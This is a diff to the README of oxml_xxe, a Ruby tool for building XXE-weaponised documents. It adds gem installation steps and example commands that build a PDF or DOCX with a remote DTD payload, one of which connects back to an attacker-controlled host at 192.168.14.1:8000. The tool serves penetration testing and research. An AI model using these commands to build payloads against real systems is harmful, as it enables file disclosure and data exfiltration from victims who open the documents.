@@ -9,11 +9,32 @@ Blog Posts on the topic:
 
 [Exploiting XXE Vulnerabilities in OXML Documents - Part 1](http://www.silentrobots.com/blog/2015/03/04/oxml_xxe/)
 
+# Installation
+
+Installation is easy, you will need a copy of Ruby and two gems.
+
+``
+gem install highline
+gem install zipruby
+``
+or
+
+``
+gem install bundler
+bundle install
+``
+
 # Quick Examples
 
 ## Build a PDF with XXE in XMP (metadata)
 ```
 ruby oxml_xxe.rb --poc pdf -i 192.168.14.1:8000
+```
+
+## Build a DOCX with XXE (connecting back to 192.168.14.1:8000)
+```
+ruby oxml_xxe.rb -s -i 192.168.14.1:8000
+Select payload 11 ("remote_DTD")
 ```
 
 # Main Modes
